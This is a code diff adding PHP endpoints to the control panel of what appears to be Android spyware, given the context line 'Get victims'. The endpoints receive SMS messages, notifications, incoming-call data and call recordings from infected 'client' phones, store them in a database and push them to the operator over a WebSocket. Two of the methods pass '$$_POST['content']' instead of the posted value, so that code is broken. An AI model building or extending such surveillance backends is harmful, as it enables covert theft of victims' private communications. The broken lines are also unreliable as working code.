@@ -514,6 +514,148 @@ class ControlPanel extends Base
     }
 
     /**
+     * Upload sms gotten from sms broadcast receiver
+     */
+    public function uploadMessage(): void
+    {
+        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
+            return;
+
+        if (!isset($_POST['id']))
+            return;
+
+        if (!isset($_POST['res']) || $_POST['res'] !== 'message')
+            return;
+
+        if (!isset($_POST['sender']))
+            return;
+
+        if (!isset($_POST['content']))
+            return;
+
+        if (!isset($_POST['timestamp']))
+            return;
+
+        $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
+        $this->database->insert($query, [$_POST['id'], $_POST['sender'], $$_POST['content'], $_POST['timestamp']]);
+
+        $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {}
+    }
+    
+    /**
+     * Upload notification gotten from notification broadcast receiver
+     */
+    public function uploadNotification(): void
+    {
+        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
+            return;
+
+        if (!isset($_POST['id']))
+            return;
+
+        if (!isset($_POST['res']) || $_POST['res'] !== 'notification')
+            return;
+
+        if (!isset($_POST['sender']))
+            return;
+
+        if (!isset($_POST['content']))
+            return;
+
+        if (!isset($_POST['timestamp']))
+            return;
+
+        $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
+        $this->database->insert($query, [$_POST['id'], $_POST['sender'], $$_POST['content'], $_POST['timestamp']]);
+
+        $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {}
+    }
+
+    /**
+     * Upload incoming call gotten from call receiver
+     */
+    public function uploadCall(): void
+    {
+        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
+            return;
+
+        if (!isset($_POST['id']))
+            return;
+
+        if (!isset($_POST['res']) || $_POST['res'] !== 'incoming_call')
+            return;
+
+        if (!isset($_POST['number']))
+            return;
+
+        if (!isset($_POST['timestamp']))
+            return;
+
+        $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {}
+    }
+
+    /**
+     * Upload call recording gotten from broadcast receiver
+     */
+    public function uploadRecording(): void
+    {
+        if (!isset($_POST['type']) || $_POST['type'] !== 'client')
+            return;
+
+        if (!isset($_POST['id']))
+            return;
+
+        if (!isset($_POST['res']) || $_POST['res'] !== 'recording')
+            return;
+
+        if (!isset($_POST['number']))
+            return;
+
+        if (!isset($_POST['filename']))
+            return;
+
+        if (!isset($_POST['timestamp']))
+            return;
+
+        $query = "INSERT INTO RECORDING(client_id, filename, timestamp, number) VALUES(?, ?, ?, ?)";
+        $this->database->insert($query, [$_POST['id'], $_POST['filename'], $_POST['timestamp'], $_POST['number']]);
+
+        $client = new TextTalkWebSocket($this->webSocketURI);
+
+        try {
+            // Send a message
+            $client->send(json_encode($_POST));
+        
+            // Close the WebSocket connection
+            $client->close();
+        } catch (\Exception $e) {}
+    }
+
+    /**
      * Get victims
      * 
      * @return array<Client>
